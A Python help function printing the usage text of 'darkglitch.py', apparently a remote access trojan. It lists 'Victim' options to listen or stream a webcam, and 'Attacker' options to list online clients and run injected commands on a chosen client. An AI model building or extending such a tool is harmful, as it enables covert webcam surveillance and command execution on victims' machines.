def help():
    print("""
    Usage:

    Victim:
        python darkglitch.py -l -c
        python darkglitch.py -l -s

    Attacker:
        python darkglitch.py -ol
        python darkglitch.py -s <client_id>
        python darkglitch.py -c <client_id> <command_injection>

    Options:
        -h, --help            Show help message
        -v, --version         Show version information

    Victim Options:
        -l, --listen          Start the client and wait for connections
        -s, --stream          Stream a webcam the client and wait for connections  

    Attacker Options:
        -ol, --online-list    List online clients
        -c, --connect         Connect to a client

    Arguments:
        <client_id>           Target client ID
        <command_injection>             Command to execute
    """)